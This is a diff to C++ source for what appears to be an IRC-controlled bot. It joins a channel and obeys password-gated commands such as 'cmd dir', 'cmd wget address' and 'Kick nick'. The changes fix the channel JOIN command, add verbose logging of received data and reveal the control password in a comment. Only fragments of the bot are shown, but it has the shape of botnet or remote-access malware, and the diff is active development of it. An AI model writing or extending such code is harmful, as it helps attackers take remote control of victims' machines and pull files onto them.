@@ -74,7 +74,8 @@ std::string const LETTERS ="abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ
 void IrcConnect(std::string HOST,std::string channel )
 {
         #ifdef D_LIB
-        logircConnect << LINFO << "Has been started with IrcConnect("<<HOST<<","<<channel<<")";
+        logircConnect << LINFO << "Has been started ";
+        logircConnect << LINFO <<"Params IrcConnect("<<HOST<<","<<channel<<")";
         #endif
 
             std::ostream request_stream(&request);
@@ -103,7 +104,7 @@ void IrcConnect(std::string HOST,std::string channel )
                 boost::asio::write(socket, request);
                 request_stream << "USER guest tolmoon tolsun :"<<REALNAME<<"\r\n";
                 boost::asio::write(socket, request);
-                request_stream << "\\join "<<"#"<<channel<<"\r\n";
+                request_stream << "JOIN  "<<"#"<<channel<<"\r\n";
 
         #ifdef D_LIB
          logircConnect << LDEBUG << "Sending \\join "<<"#"<<channel;
@@ -129,7 +130,8 @@ void IrcConnect(std::string HOST,std::string channel )
                                     {
                                         std::cout<<resev<<std::endl;
             #ifdef D_LIB
-            logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.";
+            logircConnect << LDEBUG <<"Received : \n\n"<<resev<<" \n";
+            logircConnect << LDEBUG <<"Received : "<<resev.length()<<" Bytes.\n";
             #endif
                                         int ping=resev.find("PING",starting_index);
                                         if (ping!=-1)
@@ -525,13 +527,14 @@ void cmd(void)
                         logcmd<<LINFO <<"Inside found 7 sending version string";
                         #endif // D_LIB
                         msg=("PRIVMSG "+channel2)+"Available Commands : cmd dir , Operater nick , Version , cmd wget address , display , Kick nick and Help to display this menu";
+
                         #ifdef D_LIB
                         logcmd<<LDEBUG<<"sending usage msg :"<<msg;
                         #endif // D_LIB
                     }
             }
     else
-        msg=("PRIVMSG "+channel2)+"Enter password to contine";
+        msg=("PRIVMSG "+channel2)+"Enter password to continue.....";
             #ifdef D_LIB
             logcmd<<LDEBUG <<"Sending password wrng msg :"<<msg;
             #endif // D_LIB
@@ -540,6 +543,7 @@ void cmd(void)
                         #ifdef D_LIB
                         logcmd<<LINFO <<"Password Checker string";
                         #endif // D_LIB
+                        //Almost got mixed up just type in :Password DWORD
                         int x=cont.find ("DWORD");
                         if (x<0)
                         {
